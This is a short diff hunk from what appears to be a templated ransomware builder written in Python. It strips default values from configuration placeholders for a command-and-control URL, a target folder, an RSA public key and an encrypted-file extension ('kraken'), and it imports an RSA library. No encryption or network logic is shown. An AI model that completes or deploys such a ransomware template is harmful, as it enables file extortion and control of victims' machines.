@@ -25,10 +25,10 @@ from Crypto.PublicKey import RSA
 import base64
 
 # --- CONFIGURATION ---
-C2_URL = "{{ c2_url | default('http://127.0.0.1:8000') }}"
-FOLDER_PATH = r"{{ folder_path | default('C:/Users/XXX/Documents/fake_env_Documents') }}"
+C2_URL = "{{ c2_url }}"
+FOLDER_PATH = r"{{ folder_path }}"
 RSA_KEY = "{{ rsa_key_b64 }}"
-EXTENSION = "{{ file_extension | default('kraken') }}"
+EXTENSION = "{{ file_extension }}"
 
 
 # --- LOGIQUE ---
